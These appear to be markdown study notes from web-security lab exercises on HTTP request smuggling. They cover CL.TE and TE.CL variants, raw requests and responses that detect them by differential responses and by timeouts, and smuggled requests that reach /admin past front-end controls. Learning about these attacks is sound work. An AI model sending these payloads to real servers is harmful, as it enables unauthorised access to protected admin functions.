# Content
- [HTTP request smuggling Types](#http-request-smuggling-types)
  - [CL.TE](#clte)
      - [Finding CL.TE](#finding-clte)
          - [using differential responses](#using-differential-responses)
          - [using time delay](#using-time-delay)
  - [TE.CL](#tecl)
      - [Finding TE.CL](#finding-tecl)
          - [using differential responses](#using-differential-responses-1)
          - [using time delay](#using-time-delay-1)
- [Exploiting HTTP request smuggling vulnerabilities](#exploiting-http-request-smuggling-vulnerabilities)
  - [bypass front-end security controls](#bypass-front-end-security-controls)

## HTTP request smuggling Types 
### CL.TE
the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding
#### Finding CL.TE
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Transfer-Encoding: chunked

0

G

```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Content-Length: 15


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=xoMJbTEes2ryW1PlMaosC136QVh3RPWo; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```



##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7
A
xxx

```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

### TE.CL
the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
#### Finding TE.CL
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a3200cf04cedd8280132134009f00db.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

28
GPOST / HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

29
GET /404 HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=ZxP5vPp2QyzeBn8FJ2Xa6RzpmF1bO84D; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```
## Exploiting HTTP request smuggling vulnerabilities
### bypass front-end security controls
- CL.TE
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
- TE.CL
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
